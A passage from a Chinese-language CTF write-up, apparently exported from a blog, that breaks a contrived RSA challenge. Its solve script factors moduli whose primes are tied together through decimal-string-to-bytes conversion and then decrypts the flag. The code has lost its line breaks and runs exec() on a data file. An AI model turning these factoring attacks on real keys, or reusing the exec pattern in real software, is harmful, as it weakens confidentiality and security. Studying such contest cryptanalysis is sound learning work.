v=m*l2b2l(m)        if(v&lt;n):            l=m        elif(v&gt;n):            r=m        else:            return m,n//m\nPhase 2对和进行分析：\n\n\\begin{align}\nn_2&=p_2*p_3\\\\\n&=(a_{01}+a_{11}*10+a_{21}*{10}^2+...)*(a_{02}+a_{12}*10+a_{22}*{10}^2+...)\\\\\nn_3&=q_2*q_3\\\\\n&=[(a_{01}+48)+(a_{11}+48)*256+...]*[(a_{02}+48)+(a_{12}+48)*256+...]\\\\\nTherefore,\\\\\nn_2&=a_{01}*a_{02}&(mod\\ 10)\\\\\nn_2&=(a_{01}+a_{11}*10)*(a_{02}+a_{12}*10)&(mod\\ {10}^2)\\\\\n&...\\\\\nn_2&=(a_{01}+...+a_{n1}*{10}^n)*(a_{02}+...+a_{n2}*{10}^{n})&(mod\\ {10}^{n+1})\\\\\n\\\\\nn_3&=(a_{01}+48)*(a_{02}+48)&(mod\\ 256)\\\\\n...\\\\\nn_3&=[(a_{01}+48)+...+(a_{n1}+48)*{256}^n]*[(a_{02}+48)+...+(a_{n2}+48)*{256}^n]&(mod\\ {256}^{n+1})\n\\end{align}所以可以对每一位进行爆破\n#Phase 2#Prune and Search#official writeup from maple3142def break2(n1, n2):    n1p = None    def test_digits(ps, qs):        nonlocal n1p        if n1p is not None:            return False        p = sum([pi * 10**i for i, pi in enumerate(ps)])        pp = sum([(48 + pi) * 256**i for i, pi in enumerate(ps)])        q = sum([pi * 10**i for i, pi in enumerate(qs)])        qq = sum([(48 + pi) * 256**i for i, pi in enumerate(qs)])        if p != 0 and p != 1 and n1 % p == 0:            n1p = p            return False        m1 = 10 ** len(ps)        m2 = 256 ** len(qs)        return (p * q) % m1 == n1 % m1 and (pp * qq) % m2 == n2 % m2    def find_ij(ps, qs):        for i in range(10):            for j in range(10):                if test_digits(ps + [i], qs + [j]):                    yield i, j    def search(ps, qs):        for i, j in find_ij(ps, qs):            search(ps + [i], qs + [j])    search([], [])    n2p = bytes_to_long(str(n1p).encode())    assert n2 % n2p == 0    return (n1p, n1 // n1p), (n2p, n2 // n2p)\nPhase 3第三部分很简单，可以直接参照第一部分，只是这里有一些小变化，，仍然进行二分规约\n#Phase3def break3(n1, n2):    def try_factor(l, r):        while l &lt; r:            m = (l + r) // 2            if m &gt; 1 and n1 % m == 0:                return m            if m * l2b2l(n2 // l2b2l(m)) &lt; n1:                l = m + 1            else:                r = m - 1    for i in range(16):        # brute force top 4 bits of p1        # because len(str(p1)) must be constant to have monotonic property        l = i &lt;&lt; 508        r = l + (1 &lt;&lt; 508)        if p1 := try_factor(l, r):            return (p1, n1 // p1), (l2b2l(p1), n2 // l2b2l(p1))\n所有的p和q都知道了，直接进行RSA解密即可得到flag\nEXPfrom Crypto.Util.number import *from gmpy2 import *#Phase 1def l2b2l(p):    trans=str(p).encode()    return(bytes_to_long(trans))def break1(n):    l=0    r=2**512    v=0    while(l&lt;=r):        m=(l+r)//2        v=m*l2b2l(m)        if(v&lt;n):            l=m        elif(v&gt;n):            r=m        else:            return m,n//m#Phase 2#Prune and Search#official writeup from maple3142def break2(n1, n2):    n1p = None    def test_digits(ps, qs):        nonlocal n1p        if n1p is not None:            return False        p = sum([pi * 10**i for i, pi in enumerate(ps)])        pp = sum([(48 + pi) * 256**i for i, pi in enumerate(ps)])        q = sum([pi * 10**i for i, pi in enumerate(qs)])        qq = sum([(48 + pi) * 256**i for i, pi in enumerate(qs)])        if p != 0 and p != 1 and n1 % p == 0:            n1p = p            return False        m1 = 10 ** len(ps)        m2 = 256 ** len(qs)        return (p * q) % m1 == n1 % m1 and (pp * qq) % m2 == n2 % m2    def find_ij(ps, qs):        for i in range(10):            for j in range(10):                if test_digits(ps + [i], qs + [j]):                    yield i, j    def search(ps, qs):        for i, j in find_ij(ps, qs):            search(ps + [i], qs + [j])    search([], [])    n2p = bytes_to_long(str(n1p).encode())    assert n2 % n2p == 0    return (n1p, n1 // n1p), (n2p, n2 // n2p)#Phase3def break3(n1, n2):    def try_factor(l, r):        while l &lt; r:            m = (l + r) // 2            if m &gt; 1 and n1 % m == 0:                return m            if m * l2b2l(n2 // l2b2l(m)) &lt; n1:                l = m + 1            else:                r = m - 1    for i in range(16):        # brute force top 4 bits of p1        # because len(str(p1)) must be constant to have monotonic property        l = i &lt;&lt; 508        r = l + (1 &lt;&lt; 508)        if p1 := try_factor(l, r):            return (p1, n1 // p1), (l2b2l(p1), n2 // l2b2l(p1))#breakwith open(\"output.txt\") as f:    exec(f.read())p1,q1=break1(n1)(p2,p3),(q2,q3)=break2(n2,n3)(p4,q5),(p5,q4)=break3(n4,n5)phi1=(p1-1)*(q1-1)phi2=(p2-1)*(p3-1)phi3=(q2-1)*(q3-1)phi4=(p4-1)*(q5-1)phi5=(p5-1)*(q4-1)d1=invert(e,phi1)d2=invert(e,phi2)d3=invert(e,phi3)d4=invert(e,phi4)d5=invert(e,phi5)c=pow(c,d3,n3)c=pow(c,d4,n4)c=pow(c,d5,n5)c=pow(c,d1,n1)c=pow(c,d2,n2)print(long_to_bytes(c))\n","categories":["CTF"],"tags":["CTF","CRYPTO","RSA"]}]